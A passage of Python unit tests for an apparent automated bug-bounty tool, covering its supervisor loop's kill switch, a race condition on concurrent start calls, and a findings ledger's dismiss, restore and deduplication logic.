        self.assertFalse(thread.is_alive())
        self.assertLess(elapsed, 5.0)  # nowhere near the 15s idle-wait timeout
        self.assertFalse(loop.running)

    def test_kill_switch_stops_before_a_second_due_program(self) -> None:
        portfolio.upsert_program(self.rt, {"id": "p1", "name": "P1", "scope_text": "a.com",
                                            "seed_targets": ["https://a.com"], "auto_submit": False})
        portfolio.upsert_program(self.rt, {"id": "p2", "name": "P2", "scope_text": "b.com",
                                            "seed_targets": ["https://b.com"], "auto_submit": False})
        calls: list[str] = []
        started = threading.Event()

        def run_campaign_fn(target, *, scope, program, active, live, deep=False, max_pages=12):
            calls.append(program)
            started.set()
            return {"ok": True, "run_id": "r", "findings": [], "proof_of_impact": {}}

        loop = OperatorLoop(self.rt, run_campaign_fn=run_campaign_fn, submit_fn=lambda *a, **k: {})
        thread = threading.Thread(target=loop._supervise, daemon=True)
        thread.start()
        # The moment the FIRST program's campaign fires, engage the kill switch — the
        # per-program loop's `if self.stop_event.is_set(): break` must stop it before
        # ever reaching the second due program.
        self.assertTrue(started.wait(timeout=5))
        loop.stop_event.set()
        thread.join(timeout=5)
        self.assertFalse(thread.is_alive())
        self.assertEqual(calls, ["p1"])  # p2 never ran

    def test_concurrent_start_calls_spawn_only_one_supervisor(self) -> None:
        # Regression: start()'s check-then-act on self.running was not atomic (each
        # API request runs on its own asyncio.to_thread worker), so two concurrent
        # /api/operator/start calls -- a UI double-click, a client retry, two tabs --
        # could both observe running=False before either set it True, spawning TWO
        # independent supervisor loops that hunt the same programs and can
        # double-submit the same confirmed finding to HackerOne.
        loop = OperatorLoop(self.rt, run_campaign_fn=lambda *a, **k: {}, submit_fn=lambda *a, **k: {})
        results: list[bool] = []
        results_lock = threading.Lock()
        barrier = threading.Barrier(8)

        def race() -> None:
            barrier.wait(timeout=5)
            won = loop.start()
            with results_lock:
                results.append(won)

        threads = [threading.Thread(target=race) for _ in range(8)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=5)
        self.assertEqual(results.count(True), 1, "exactly one concurrent start() call must win the race")
        self.assertEqual(results.count(False), 7)
        loop.stop()
        loop._thread.join(timeout=5)
        self.assertFalse(loop.running)


class DismissTests(unittest.TestCase):
    """Delete a finding -> permanently suppressed: gone from the durable history, the
    funnel, and the CSV export, and filtered out of every future hunt by the SAME stable
    dedup key the engine keys on. Reversible via restore (money/stage data preserved)."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.rt = self._tmp.name

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def test_dismiss_hides_from_history_and_funnel_then_restore_brings_it_back(self) -> None:
        item = _item("C1", "xss", "r", "https://x/a", proof="confirmed")
        ledger.upsert_findings(self.rt, "acme", "https://x", [item])
        self.assertEqual(len(ledger.list_all(self.rt)), 1)
        self.assertEqual(ledger.funnel(self.rt, "acme")["total"], 1)

        entry = ledger.dismiss(self.rt, finding=item["finding"], program="acme", target="https://x")
        self.assertEqual(entry["dedup_key"], item["dedup_key"])
        self.assertTrue(ledger.is_dismissed(self.rt, item["finding"]))
        self.assertEqual(ledger.list_all(self.rt), [])            # gone from durable history
        self.assertEqual(ledger.funnel(self.rt, "acme")["total"], 0)  # and out of the funnel
        self.assertEqual(ledger.to_csv_rows(self.rt, "acme", "https://x"), [])  # and the export

        self.assertTrue(ledger.restore(self.rt, item["dedup_key"]))
        self.assertFalse(ledger.is_dismissed(self.rt, item["finding"]))
        self.assertEqual(len(ledger.list_all(self.rt)), 1)        # reappears intact

    def test_delete_sticks_across_a_digit_change_in_the_location(self) -> None:
        # The whole point of "should not be found again": a re-run surfaces the SAME issue
        # at a path whose only difference is digits (…/a/123 vs …/a/456). The dedup key
        # normalizes digits, so the delete of one suppresses the other on the next run.
        deleted = _finding("F1", "xss", "r", "https://x/a/123")
        ledger.dismiss(self.rt, finding=deleted)
        fresh_next_run = _finding("F1", "xss", "r", "https://x/a/456")
        self.assertIn(ledger.dedup_key(fresh_next_run), ledger.dismissed_keys(self.rt))

    def test_dismiss_by_explicit_key_is_the_history_delete_path(self) -> None:
        # The durable-history row already carries a dedup_key; deleting from history sends
        # that key directly (no finding dict needed) and it must suppress just the same.
        item = _item("C1", "ssrf", "r", "https://x/b", proof="missing")
        ledger.upsert_findings(self.rt, "acme", "https://x", [item])
        entry = ledger.dismiss(self.rt, dedup_key_str=item["dedup_key"])
        self.assertEqual(entry["dedup_key"], item["dedup_key"])
        self.assertEqual(ledger.list_all(self.rt), [])

    def test_dismiss_with_no_key_and_no_finding_returns_empty(self) -> None:
        self.assertEqual(ledger.dismiss(self.rt), {})
        self.assertEqual(ledger.dismissed_keys(self.rt), set())  # nothing recorded

    def test_restore_unknown_key_is_a_safe_no_op(self) -> None:
        self.assertFalse(ledger.restore(self.rt, "never-dismissed"))
        self.assertFalse(ledger.restore(self.rt, ""))

    def test_distinct_cve_products_on_one_page_get_distinct_keys(self) -> None:
        # Known-CVE ("vulnerable-component") findings for different libraries on the SAME page
        # share class_id/rule_id/location; without the product they collapse to one dedup key,
        # so deleting one library would silently suppress the other. The product keeps them
        # distinct, and a delete of one must NOT dismiss the other.
        base = {"class_id": "vulnerable-component", "rule_id": "passive.known-cve", "location": "https://ex.com/app"}
        jquery = {**base, "_cve_product": "jquery", "title": "Outdated jQuery"}
        lodash = {**base, "_cve_product": "lodash", "title": "Outdated Lodash"}
        self.assertNotEqual(ledger.dedup_key(jquery), ledger.dedup_key(lodash))
        ledger.dismiss(self.rt, finding=jquery)
        self.assertIn(ledger.dedup_key(jquery), ledger.dismissed_keys(self.rt))
        self.assertNotIn(ledger.dedup_key(lodash), ledger.dismissed_keys(self.rt))  # Lodash survives

    def test_non_cve_findings_keys_unchanged_by_product_logic(self) -> None:
        # A finding with no _cve_product must key exactly as before (backward compatible).
        f = {"class_id": "xss", "rule_id": "r", "location": "https://x/a"}
        import hashlib
        expected = hashlib.sha1(b"xss|r|https://x/a").hexdigest()[:20]
        self.assertEqual(ledger.dedup_key(f), expected)

    def test_restore_preserves_a_paid_findings_money(self) -> None:
        # Deleting a submitted+paid finding hides its bounty from the funnel while dismissed,
        # but the record (and its $) is preserved so a restore is lossless.
        item = _item("C1", "xss", "r", "https://x/a", proof="confirmed")
        ledger.upsert_findings(self.rt, "acme", "https://x", [item])
        ledger.record_submission(self.rt, "acme", "https://x", item["dedup_key"], "R1", "u")
        ledger.record_paid(self.rt, "acme", "https://x", item["dedup_key"], 500.0)
        self.assertEqual(ledger.funnel(self.rt, "acme")["bounty_total"], 500.0)

        ledger.dismiss(self.rt, dedup_key_str=item["dedup_key"])
        self.assertEqual(ledger.funnel(self.rt, "acme")["bounty_total"], 0.0)  # hidden while deleted
        ledger.restore(self.rt, item["dedup_key"])
        self.assertEqual(ledger.funnel(self.rt, "acme")["bounty_total"], 500.0)  # lossless


if __name__ == "__main__":
    unittest.main()
